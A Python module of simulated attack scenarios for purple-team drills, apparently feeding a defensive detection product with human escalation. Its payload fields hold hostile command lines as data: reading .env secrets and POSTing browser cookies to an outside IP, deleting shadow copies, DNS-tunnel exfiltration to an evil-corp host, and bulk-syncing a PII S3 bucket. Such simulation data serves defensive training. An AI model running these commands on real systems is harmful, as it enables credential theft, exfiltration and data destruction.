"""
TUESDAY RedTeam: Attack Scenario Arsenal (Python)
Provides attack drill definitions for Purple-Team simulations.
"""

SCENARIOS = {
    "privacy_harvester": {
        "id": "SIM-004",
        "title": "Covert Telemetry Harvester & Browser Credential Spyware",
        "track": "Cybersecurity & Privacy (Track 4)",
        "source": "Endpoint Behavioral Sensor / Host EDR",
        "targetHost": "DEV-WORKSTATION-09 (192.168.20.14)",
        "ioc": "185.220.101.99",
        "payload": "python3 -c \"import os, glob; [print(open(f).read()) for f in glob.glob('**/.env', recursive=True)]\" & curl -X POST https://185.220.101.99/telemetry/harvest --data @cookies.sqlite",
        "mitreTtp": "T1555 (Credentials from Password Stores) / T1041 (Exfiltration Over C2)",
        "description": "A background utility disguises itself as an analytics daemon while harvesting local `.env` API keys, developer SSH tokens, and browser session cookies to beacon out to an unauthorized C2 collector."
    },
    "ransomware_lockbit": {
        "id": "SIM-001",
        "title": "LockBit 3.0 Ransomware Outbreak Attempt",
        "track": "Defense & Sandboxing",
        "source": "CrowdStrike EDR Sensor",
        "targetHost": "FIN-SERVER-04 (192.168.10.45)",
        "ioc": "185.220.101.5",
        "payload": "powershell.exe -enc SQBFAFgAKABOAGUAdw... vssadmin delete shadows /all /quiet & LockBit3.0_Payload.exe",
        "mitreTtp": "T1486 (Data Encrypted for Impact) / T1490 (Inhibit System Recovery)",
        "description": "Malicious payload initiates LSASS dumping and triggers system shadow-copy deletion before staging AES-256 file encryption across the finance enclave."
    },
    "dns_tunnel_c2": {
        "id": "SIM-005",
        "title": "Stealthy Covert DNS Tunneling & Data Siphon",
        "track": "Surveillance Transparency & Network Defense",
        "source": "Core DNS Resolver / Zeek IDS",
        "targetHost": "RND-NODE-02 (192.168.30.18)",
        "ioc": "193.142.146.88",
        "payload": "nslookup -type=TXT dGhpcyBpcyBhbiBleGZpbHRyYXRpb24gdGVzdC4=.c2.evil-corp.net 193.142.146.88",
        "mitreTtp": "T1071.004 (DNS Communication Channel) / T1048 (Exfiltration Over Alternative Protocol)",
        "description": "Adversary encodes sensitive internal database dumps into base64 subdomains, transmitting chunks via spoofed UDP DNS queries to bypass standard port-based firewalls."
    },
    "apt_supply_chain": {
        "id": "SIM-003",
        "title": "APT SUNBURST Supply Chain Trojan on Domain Controller",
        "track": "Defense & Sandboxing / HITL Governance",
        "source": "Active Directory / Windows Event Log",
        "targetHost": "DC-PRIMARY-01 (192.168.1.10)",
        "ioc": "45.154.255.87",
        "payload": "SolarWinds.Orion.Core.BusinessLayer.dll injected into memory -> DNS Tunneling C2 Beaconing -> Golden Ticket requested.",
        "mitreTtp": "T1195.002 (Supply Chain Compromise) / T1558.001 (Golden Ticket)",
        "description": "Backdoored software update binary injected on core Domain Controller. Demonstrates Sentinel's Human-in-the-Loop governance: high risk on critical infrastructure stops autonomous host termination and forces human escalation."
    },
    "cloud_sts_exfil": {
        "id": "SIM-002",
        "title": "AWS Cloud Credential Compromise & S3 Mass-Download",
        "track": "Cloud Defense",
        "source": "AWS CloudTrail Event Stream",
        "targetHost": "AWS-S3-PROD-LOGS (cloud-aws)",
        "ioc": "193.142.146.35",
        "payload": "aws sts assume-role --role-arn arn:aws:iam::123456789012:role/DevAdmin && aws s3 sync s3://customer-pii-vault ./local_loot",
        "mitreTtp": "T1530 (Data from Cloud Storage) / T1078.004 (Cloud Accounts)",
        "description": "Compromised developer credentials used to assume broad IAM role and stage automated bulk downloads from sensitive S3 data repositories."
    }
}
